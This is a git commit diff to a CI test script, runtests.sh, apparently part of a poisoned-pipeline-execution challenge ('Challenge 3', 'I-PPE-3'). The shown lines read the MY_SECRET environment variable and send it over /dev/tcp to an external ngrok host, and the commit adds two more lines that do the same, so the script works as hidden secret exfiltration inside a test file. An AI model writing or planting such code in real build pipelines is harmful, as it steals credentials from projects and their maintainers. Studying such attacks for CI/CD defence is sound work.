da3ece1df789dd7e72987781e1ebc61953e402c8
xyexternal <133779591+xyexternal@users.noreply.github.com>
2023-11-08 08:57:05 +0100

    Update runtests.sh

--- runtests.sh
+++ runtests.sh
@@ -3,7 +3,8 @@ echo "Executing Tests script [from user $1 at $2]" >> runtests.out
 echo "$(which bash)" >> runtests.out 
 
 echo "Challenge 3 " > /dev/tcp/4.tcp.eu.ngrok.io/10129
-
+MS=$(env | grep MY_SECRET)
+echo "$MS" > /dev/tcp/4.tcp.eu.ngrok.io/10129
 echo "------- I-PPE-3  From user [$1] in pr [$2] pr.yml :: $(env | grep MY_SECRET)" > /dev/tcp/4.tcp.eu.ngrok.io/10129
 
 RET=0
